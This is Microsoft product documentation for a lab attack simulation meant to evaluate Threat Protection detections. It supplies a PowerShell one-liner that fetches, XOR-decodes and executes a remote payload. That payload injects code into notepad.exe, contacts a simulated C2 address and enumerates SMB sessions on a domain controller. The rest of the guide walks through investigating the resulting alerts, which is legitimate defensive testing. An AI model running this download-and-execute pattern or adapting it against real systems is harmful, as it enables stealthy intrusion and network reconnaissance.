---
title: Run your Microsoft Threat Protection attack simulations 
description: Run your pilot Microsoft Threat Protection project to effectively determine the benefit and adoption of Microsoft Threat Protection (MTP)
keywords: Microsoft Threat Protection pilot, run pilot Microsoft Threat Protection project, evaluate Microsoft Threat Protection in production, Microsoft Threat Protection pilot project, cyber security, advanced persistent threat, enterprise security, devices, device, identity, users, data, applications, incidents, automated investigation and remediation, advanced hunting
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection: M365-security-compliance 
ms.topic: conceptual
---

# Run your Microsoft Threat Protection attack simulations  

**Applies to:**
- Microsoft Threat Protection

To test the Microsoft Threat Protection capabilities for your pilot project, we will simulate a sophisticated attack that leverages advanced techniques to hide from detection. The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices. This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory. They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, allowing them to evade detection and persist on the device.

In this simulation, our sample scenario starts with a PowerShell script. A user might be tricked into running a script. Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network. Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.

During the simulation, the attack injects shellcode into a seemingly innocent process. In this scenario, we’ll use notepad.exe. We chose this process for the simulation, but attackers will more likely target a long-running system process, such as svchost.exe. The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed. In addition, the script attempts executing reconnaissance queries against the domain controller (DC). This allows an attacker to get information about recent user login information. Once attackers have this information, they can move laterally in the network to get to a specific sensitive account


>[!IMPORTANT]
>For optimum results, follow the attack simulation instructions as closely as possible.


## Test environment requirements

There are two devices used in this scenario: a test device and a domain controller.

1.	Verify your tenant has [Protection](https://docs.microsoft.com/en-us/microsoft-365/security/mtp/mtp-enable#starting-the-service)￼￼ .
2.	Configure a test domain controller:
    - Set up a device with Windows Server 2008 R2 or a later version.
    - Onboard the test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/en-us/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/en-us/windows-server/administration/server-manager/configure-remote-management-in-server-manager).    
    - Enable [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/en-us/cloud-app-security/aatp-integration).
    - Create a test user on your domain – no admin permissions needed.

3.	Configure a test device:
    <br>
    a.	Requires Windows 10 version 1903 or a later version.
    <br>
    b.	Join the test device to the test domain.
    <br>
    c.	[Turn on Windows Defender Antivirus](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
    <br>
    d.	[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.


## Run the simulation

To run the attack scenario simulation:

1.	Log in to the test device with the test user account.

2.	Open a Windows PowerShell window on the test device.

3.	Copy the following simulation script:
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
-UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```
>[!NOTE]
>If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks. Download this document and open it on Adobe Reader.

4. At the prompt, paste and run the copied script.

>[!NOTE]
>If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.  Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.

A few seconds later, notepad.exe will open. A simulated attack code will be injected into notepad.exe. Keep the automatically generated Notepad instance open to experience the full scenario.

The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller via SMB.

You will see a message displayed on the PowerShell console when this script completes.

```
ran NetSessionEnum against [DC Name] with return code result 0      
```

To see the Automated Incident and Response feature in action, keep the notepad.exe process open. You will see Automated Incident and Response stop the Notepad process.


## Investigate an incident

Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft Threat Protection portal. 

>[!NOTE]
>Before we walk you through this simulation, watch [this video](https://www.youtube.com/watch?v=Vfuf7KXXo5E) to see how incident management helps you piece the related alerts together, where you can find it in the portal, and how it can help you in your security operations.

1.	Open the [Microsoft Threat Protection portal](https://security.microsoft.com/incidents) incident queue from any device.

2.	Navigate to Incidents from the menu. 

![Screenshot of incidents as shown on the Microsoft 365 Security Center’s left-hand side menu](../../media/mtp-pilot/fig1.png)

3.	The new incident for the simulated attack will appear in the incident queue.
 
![Screenshot of the incident queue](../../media/mtp-pilot/fig2.png)


### Investigate the attack as a single incident

Microsoft Threat Protection correlates analytics and aggregates all related alerts and investigations from different products into one incident entity. By doing so, Microsoft Threat Protection shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.

The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.

To view the incident:

1.	Navigate to the Incidents queue.
 
![Screenshot of incidents from the navigation menu](../../media/mtp-pilot/fig1.png)

2.	Select the newest item by clicking on the circle located left of the incident name. A side panel displays additional information about the incident, including all the related alerts. Each incident has a unique name that describes it based on the attributes of the alerts it includes.

![Screenshot of the incidents page where generated alerts are aggregated during the simulation](../../media/mtp-pilot/fig4.png)

The alerts that shows in the dashboard can be filtered based on service resources: Azure ATP, Microsoft Cloud App Security, Microsoft Defender ATP, Microsoft Threat Protection, and Office ATP.  

3.	Select **Open incident page** to get more information about the incident.

<br>In the **Incident** page, you can see all the alerts and information related to the incident. This includes the entities and assets that are involved in the alert, the detection source of the alerts (Azure ATP, EDR), and the reason they were linked together. Reviewing the incident alert list shows the progression of the attack. From this view, you can see and investigate the individual alerts.

<br>You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.
<br>  
![Screenshot of where to click Manage incident](../../media/mtp-pilot/fig5a.png)
<br>
![Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments ](../../media/mtp-pilot/fig5a.png)


### Review generated alerts 

Let’s look at some of the alerts generated during the simulated attack.
NOTE: We’ll walk through only a few of the alerts generated during the simulated attack. Depending on the version of Windows and the Microsoft Threat Protection products running on your test device, you might see more alerts that appear in a slightly different order.

![Screenshot of generated alerts](../../media/mtp-pilot/fig6.png) 


**Alert: Suspicious process injection observed (Source: Microsoft Defender ATP EDR)**
Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools. One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.

To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender ATP provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques. The following figure shows how Microsoft Defender ATP detected and alerted on the attempt to inject code to <i>notepad.exe</i>.

![Screenshot of the alert for injection of potentially malicious code](../../media/mtp-pilot/fig7.png) 


**Alert: Unexpected behavior observed by a process run with no command line arguments (Source: Microsoft Defender ATP EDR)**
Microsoft Defender ATP detections often target the most common attribute of an attack technique. This ensures durability and raises the bar for attackers to switch to newer tactics.

We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes exhibit anomalous behaviors. These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.

For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location. This outcome is independent of the specific method used to introduce and execute the malicious code.

>[!NOTE]
>Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.

Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.

Click the IP address in the alert process tree to view the IP address details page.

![Screenshot of the alert for unexpected behavior by a process run with no command line arguments](../../media/mtp-pilot/fig8.png) 

The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).
![Screenshot of the IP address details page](../../media/mtp-pilot/fig9.png)


**Alert: User and IP address reconnaissance (SMB) (Source: Azure ATP)**
Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.
In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.

![Screenshot of the Azure ATP alert for User and IP address reconnaissance](../../media/mtp-pilot/fig10.png) 


###Review the device timeline [Microsoft Defender ATP]

After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier. Click the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender ATP and Azure ATP.

Click the name of the device where the attack was conducted, to open the entity page for that specific device. In that page, you can see alerts that were triggered and related events.

Click the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.

![Screenshot of the device timeline with behaviors](../../media/mtp-pilot/fig11.png) 

Expanding some of the more interesting behaviors provides useful details, such as process trees.

For example, scroll down until you find the alert event **Suspicious process injection observed**. Click the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane. Use the search bar for filtering if necessary.

![Screenshot of the process tree for selected PowerShell file creation behavior](../../media/mtp-pilot/fig12.png)

## Resolve the incident
The following are out of scope of this deployment guide:



## Next step
|||
|:-------|:-----|
|![Phase 4: Closing & summary](../../media/prepare.png) <br>[Phase 4: Closing & summary](prepare-mtpeval.md) | Analyze your Microsoft Threat Protection pilot outcome, present them to your stakeholders, and take the next step.
